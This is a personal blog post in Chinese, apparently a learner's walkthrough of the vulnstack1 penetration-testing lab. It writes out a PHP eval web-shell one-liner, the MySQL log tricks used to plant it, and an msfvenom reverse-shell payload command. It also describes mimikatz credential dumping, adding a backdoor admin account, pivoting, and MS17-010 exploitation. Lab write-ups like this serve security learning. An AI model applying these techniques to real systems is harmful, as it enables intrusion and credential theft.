@@ -1,0 +1,1193 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      渗透靶场-vulnstack1 | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「渗透靶场-vulnstack1」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/" itemprop="url">
+		渗透靶场-vulnstack1
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/" itemprop="url">
+		<time datetime="2022-01-19T14:05:11.000Z" itemprop="dateUpdated">
+	  		2022-01-19
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class=" ">
+			渗透测试
+		</a>
+	
+		<a href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class=" ">
+			渗透靶场
+		</a>
+	
+		<a href="/tags/vulnstack/" class=" ">
+			vulnstack
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="NOTE-vulnstack1-红日靶场（一）-渗透笔记"><a href="#NOTE-vulnstack1-红日靶场（一）-渗透笔记" class="headerlink" title="[NOTE] vulnstack1-红日靶场（一）-渗透笔记"></a>[NOTE] vulnstack1-红日靶场（一）-渗透笔记</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>终于开始搞渗透啦啊啊啊啊啊啊<br>VMware你做个人吧啊啊啊啊啊</p>
+<p>第一次搞渗透（第零次是《MSF魔鬼训练营》的远古失修靶场，效果太差了）<br>很多地方都是参照别人的流程和思路一步步跟着来的</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41821603/article/details/109948920">红日靶场(vulnstack)一 超全面详细的渗透测试学习笔记</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.fdfox.cn/articles/web/4463.html">红日靶场_ATT&amp;CK红队实战（一）：学习笔记</a></li>
+<li><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/261642.html">红日安全-ATT&amp;CK实战：Vulnstack靶场实战（一）</a></li>
+</ul>
+<h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119110446120.png" alt="image-20220119110446120"></p>
+<p>还有物理机（Win 10）也充当攻击者，IP大概是10.10.10.254（虚拟外网的网关）</p>
+<h2 id="三、Web服务器渗透"><a href="#三、Web服务器渗透" class="headerlink" title="三、Web服务器渗透"></a>三、Web服务器渗透</h2><p>仅拿到Web服务器IP，可以先浏览器访问IP，看看有没有页面<br>发现直接给出了phpStudy探针：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119111041343.png" alt="image-20220119111041343"></p>
+<p>收集到以下信息：</p>
+<p>OS：Win7 SP1<br>Web服务器：Apache 2.4.23<br>PHP版本：PHP 5.4.45<br>路径：C:&#x2F;phpStudy&#x2F;WWW<br>支持打开远程文件（allow_url_fopen）<br>MySQL端口：3306</p>
+<p>此外使用nmap探测端口：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119111832965.png" alt="image-20220119111832965"></p>
+<p>还有一个TCP 135对应msrpc？</p>
+<p>在探针页面的MySQL连接测试处，测试phpStudy的默认弱口令root:root<br>成功：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119112033813.png" alt="image-20220119112033813"></p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119112050553.png" alt="image-20220119112050553"></p>
+<p>得到MySQL数据库账号密码：root:root</p>
+<p>尝试直接远程连接数据库，没权限：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119112422994.png" alt="image-20220119112422994"></p>
+<p>下面御剑扫扫后台试试：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119113507763.png" alt="image-20220119113507763"></p>
+<p>发现有<strong>phpMyAdmin</strong>、beifen.rar、phpinfo.php</p>
+<p>phpinfo.php可以发现更多Web服务器的配置信息：<br>PHP设置路径：C:\phpStudy\php\php-5.4.45\php.ini （这个应该参照旧版phpStudy的默认配置路径就知道）<br>Apache路径：C:&#x2F;phpStudy&#x2F;Apache</p>
+<p>此外在phpinfo页有一个“Environment”板块，包含了很多服务器主机的信息：<br>x86系统、域用户“GOD”、用户名“STU1$”</p>
+<p>剩下有两个方向：<br>beifen.rar以及phpMyAdmin</p>
+<hr>
+<p>beifen.rar</p>
+<p>解包，发现是yxcms</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119144038150.png" alt="image-20220119144038150"></p>
+<p>其中.&#x2F;yxcms&#x2F;protected&#x2F;config.php配置文件，包含了数据库账户密码等信息<br>和上面测试出来的弱口令是一样的：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119144310302.png" alt="image-20220119144310302"></p>
+<p>还有yccms的版本：1.2.1</p>
+<p>浏览器尝试访问yxcms：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119144456631.png" alt="image-20220119144456631"></p>
+<p>发现公告信息给出了系统后台的默认账号密码：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119144517148.png" alt="image-20220119144517148"></p>
+<p>试一下登录</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119144558622.png" alt="image-20220119144558622"></p>
+<p><del>验证码都能输错N次</del>成功：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119144714704.png" alt="image-20220119144714704"></p>
+<p>下面又分有三种思路：<br>搞到源码了，可以考虑代码审计，看看有没有漏洞（能力好的话就推荐）<br>上网搜索相关漏洞，看看能不能利用（推荐）<br>自己手工黑盒挖（闲的话就推荐）</p>
+<p>上网找到一些<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/184853.html">漏洞信息</a>（版本不同也可以试一试）<br>例如一个存储型打向管理员的XSS（或者是<code>&lt;svg/onload=alert(1)&gt;</code>）：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119150434353.png" alt="image-20220119150434353"></p>
+<p>管理员后台登陆查看留言板就弹窗：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119150523624.png" alt="image-20220119150523624"></p>
+<p>不过这里不是挖SRC，这里的“渗透”就尽管getshell就好<br>&#x3D;&#x3D;这些“小”漏洞后面放到专门的CMS漏洞分析练习好了&#x3D;&#x3D;</p>
+<p>聚焦一个任意文件写入的漏洞<br>位置：后台-&gt;管理首页-&gt;全局设置-&gt;前台模板-&gt;管理模板文件<br>可以看到很多php脚本文件，估计是目录列表：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119154346380.png" alt="image-20220119154346380"></p>
+<p>新建一个模板，写入一句话：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119154440847-16425783377841.png" alt="image-20220119154440847"></p>
+<p>成功：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119154548452.png" alt="image-20220119154548452"></p>
+<p>下面的问题是找到该文件的完整路径<br>根据下载下来的备份文件，找出模板的存放位置：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119155009151.png" alt="image-20220119155009151"></p>
+<p>尝试访问：<br><code>http://10.10.10.4/yxcms/protected/apps/default/view/default/hac.php</code><br>没有报404，说明可能这就是链接地址</p>
+<p>（后面听说也可以直接使用路径穿越的方法写马到网站根目录..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;hac.php）</p>
+<p>蚁剑连接，成功：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119155232077.png" alt="image-20220119155232077"></p>
+<p>顺便发现用户权限是SYSTEM</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119155400367.png" alt="image-20220119155400367"></p>
+<p>至此简单拿下了Web服务器权限？</p>
+<hr>
+<p>phpMyAdmin</p>
+<p>了解到还可以利用phpMyAdmin的file_into或者是全局日志来get shell<br>那就学习学习</p>
+<p><strong>file_into方法</strong></p>
+<p>涉及到一个MySQL的配置字段：<code>secure_file_priv</code><br>就是以前了解到的“NULL”值、具体目录值以及为空有不同区别的那个<br>MySQL outfile函数</p>
+<p>登录phpMyAdmin：<a target="_blank" rel="noopener" href="http://10.10.10.4/phpmyadmin">http://10.10.10.4/phpmyadmin</a><br>发现MySQL版本：5.5.53<br>然后phpMyAdmin本身的版本是：phpStudy 2014</p>
+<p>在“mysql”库看看配置字段值：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119163221478.png" alt="image-20220119163221478"></p>
+<p>为“NULL”，走不通</p>
+<hr>
+<p><strong>全局日志方法</strong></p>
+<p>MySQL配置字段<code>general_log</code>以及<code>general_log_file</code><br>当<code>general_log</code>为“ON”时，好像任何操作都会被写入<code>general_log_file</code>指定的文件中</p>
+<p>查询相关设置：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119164105873.png" alt="image-20220119164105873"></p>
+<p>修改下（网站路径上面得到了）：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119164449203.png" alt="image-20220119164449203"></p>
+<p>验证：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119164542169.png" alt="image-20220119164542169"></p>
+<p>执行<code>select &quot;&lt;?php @eval($_POST[&#39;hack&#39;]); ?&gt;&quot;;</code>写入一句话：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119164649425.png" alt="image-20220119164649425"></p>
+<p>然后没错的话已经写好了指定木马文件，访问看看：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119164824032.png" alt="image-20220119164824032"></p>
+<p>没报404，蚁剑连接：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119164901592.png" alt="image-20220119164901592"></p>
+<p>OKK，SYSTEM权限</p>
+<hr>
+<p><strong>慢日志方法</strong></p>
+<blockquote>
+<p>一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。</p>
+</blockquote>
+<p>查看相关配置字段：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119165449112.png" alt="image-20220119165449112"></p>
+<p>修改下：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119170249623.png" alt="image-20220119170249623"></p>
+<p>验证：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119170320181.png" alt="image-20220119170320181"></p>
+<p>估计剩下的和上面全局日志的方法差不多，不过需要使写入shell的查询语句超过系统指定的时间，使其成为慢查询</p>
+<p>查看慢查询时间：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119170432562.png" alt="image-20220119170432562"></p>
+<p>十秒，那就sleep(11)：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119170603662.png" alt="image-20220119170603662"></p>
+<p>11秒后：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119170622566.png" alt="image-20220119170622566"></p>
+<p>蚁剑连接测试：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119170659325.png" alt="image-20220119170659325"></p>
+<p>也OKK</p>
+<hr>
+<p>小杰下</p>
+<p>就是搞到了MySQL的root账户密码，然后就可以修改各种配置字段<br>然后使用任意方法写入shell</p>
+<p>其中phpMyAdmin提供了一个窗口<br>修改好字段使用别的框架或软件远程连接MySQL再进行写马也行</p>
+<p>例如放行远程连接MySQL权限，让其变成公交车的命令：<br><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119171557698.png" alt="image-20220119171557698"></p>
+<p>再远程连接：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119171640492.png" alt="image-20220119171640492"></p>
+<p>成功</p>
+<p>目前是上传了小马到了Web服务器，还是SYSTEM权限（靶场太好了555）<br>下面要进行的就是横向渗透或内网渗透</p>
+<p>主要使用msf以及cs</p>
+<p>（下面就不熟了甚至是不会了，可能有点错误）</p>
+<p>首先利用msf生成一个反弹shell，利用蚁剑放到Web服务器上</p>
+<p>（nm，变得巨卡，重启下）</p>
+<p>（还要复习一下msf的具体操作，cs的操作还要新学）<br>（杀了我吧。。。。）</p>
+<p>首先通过蚁剑终端查看系统信息（上面php探针等显示的可能不太准确）：<br>主要是知道系统类型为x64，后面生成shell要用到</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119211451013.png" alt="image-20220119211451013"></p>
+<p>还可以看到系统的补丁情况和内网网段——192.168.10.0&#x2F;24：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119211542289.png" alt="image-20220119211542289"></p>
+<p><code>msfvenom -l payloads | less</code>：查看所有可用木马payload</p>
+<p><code>msfvenom -l payloads | grep &#39;windows/x64/meteroerter&#39;</code><br>进一步查找精准可用的payload</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119212018895.png" alt="image-20220119212018895"></p>
+<p>选择最常用的reverse_tcp<br><code>windows/x64/meterpreter/reverse_tcp</code></p>
+<p>生成木马（完全没有免杀）：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=5354 -f exe -o haha.exe</code></p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119212530893.png" alt="image-20220119212530893"></p>
+<p>kali msf这边开启监听：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119213011011.png" alt="image-20220119213011011"></p>
+<p>看看能不能通过蚁剑直接运行木马：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119213110517.png" alt="image-20220119213110517"></p>
+<p>OKKK，检查权限：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119213545797.png" alt="image-20220119213545797"></p>
+<p>系统管理员权限，简单靶场环境真的好香</p>
+<p>抓取密码（听说是域内所有用户的密码）的哈希：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119214352291.png" alt="image-20220119214352291"></p>
+<p>或者是使用mimikatz模块：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119214548072.png" alt="image-20220119214548072"></p>
+<p>其中<code>help kiwi</code>可以查看mimikatz的命令</p>
+<p><code>creds_all</code>，然后就出来了。。。。好厉害</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119214705596.png" alt="image-20220119214705596"></p>
+<p>又可以创建一个新的拥有管理员权限的黑用户</p>
+<p>先看看现在都有哪些用户：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119215410416.png" alt="image-20220119215410416"></p>
+<p>转到服务器cmd：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119215737523-16426006583931.png" alt="image-20220119215737523"></p>
+<p>添加用户并添加到管理员组：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119220247785.png" alt="image-20220119220247785"></p>
+<p>下面开启Web服务器上的远程桌面服务：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119220601478.png" alt="image-20220119220601478"></p>
+<p>尝试远程桌面：<br>（可以用之前得到的管理员账户密码，也可以用刚刚新创建的管理员用户）</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119220755801.png" alt="image-20220119220755801"></p>
+<p>可惜登录会有一些限制：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119220825738.png" alt="image-20220119220825738"></p>
+<h2 id="四、横向渗透"><a href="#四、横向渗透" class="headerlink" title="四、横向渗透"></a>四、横向渗透</h2><p>之前已经得到了内网网段：192.168.10.0&#x2F;24</p>
+<p>自动探测路由：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119221317287.png" alt="image-20220119221317287"></p>
+<p>或者手动添加：<br><code>run autoroute -s 192.168.10.0/24</code></p>
+<p>查看路由：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119222348654.png" alt="image-20220119222348654"></p>
+<p>下面使用sock，让Web服务器进行代理，渗透内网<br>查找相关模块：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119223106139.png" alt="image-20220119223106139"></p>
+<p>使用第一个，然后看参数：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119223450716.png" alt="image-20220119223450716"></p>
+<p>其中VERSION字段设置socks代理的版本，&#x3D;&#x3D;这里用“4a”&#x3D;&#x3D;（why？）<br>SRVHOST字段设置成攻击者的IP</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119223657368.png" alt="image-20220119223657368"></p>
+<p>然后执行</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119223735063.png" alt="image-20220119223735063"></p>
+<p>可以jobs下查看运行状况：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119224423995.png" alt="image-20220119224423995"></p>
+<p>此时会在&#x2F;etc下生成代理链配置文件<code>proxychains4.conf</code>（具体名字根据版本而定）</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119223842607.png" alt="image-20220119223842607"></p>
+<p>修改加上最后面那行（更正端口）：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119224058299.png" alt="image-20220119224058299"></p>
+<p>然后验证代理成功，尝试内网访问Web服务器：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119224230900.png" alt="image-20220119224230900"></p>
+<p>OKKKK</p>
+<p>好像此时所有针对内网的数据交换都会由Web服务器进行代理？<br>&#x3D;&#x3D;（后面真的得深入学学）&#x3D;&#x3D;</p>
+<p>内网网段主机发现<br>有下面几种模块</p>
+<p>auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep    #基于udp协议发现内网存活主机<br>auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe    #基于udp协议发现内网存活主机<br>auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname         #基于netbios协议发现内网存活主机</p>
+<p>或者查找相关模块：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119225248572.png" alt="image-20220119225248572"></p>
+<p>这里试试编号5</p>
+<p>我错了，UDP扫描也太慢了吧。。。。</p>
+<p>结果只发现了两台主机：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119231654382.png" alt="image-20220119231654382"></p>
+<p>试试看auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname，结果：</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119231925992.png" alt="image-20220119231925992"></p>
+<p>这个还准确点，连物理机的所有IP都扫出来了</p>
+<p>得知内网有三台主机10（Web服务器）、20、30</p>
+<p>然后各自扫一下</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119234314804.png" alt="image-20220119234314804"></p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220119234537057.png" alt="image-20220119234537057"></p>
+<p>扫出来说20有MS08-067、MS17-010，30有CVE-2009-3103</p>
+<p>试试ms17-010<br>探测是这个模块：auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p>
+<p>探测出20确实有这个漏洞</p>
+<p>然后就可以搞了<br>不蓝屏，并且可以执行命令的模块是这个：auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</p>
+<p><img src="/2022/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-vulnstack1/image-20220120101935436.png" alt="image-20220120101935436"></p>
+<p>另外扫描结果也发现30也开启了4445端口，ms17-010扫一下，发现也有漏洞</p>
+<p>下面进行不下去了，要学的东西太多了<br>先烂个尾</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13743389.html">ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程</a></p>
+<p>啊啊啊啊啊啊&#x3D; &#x3D;</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/default.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">
+								Linux攻防-权限维持及痕迹隐藏			
+							</a>
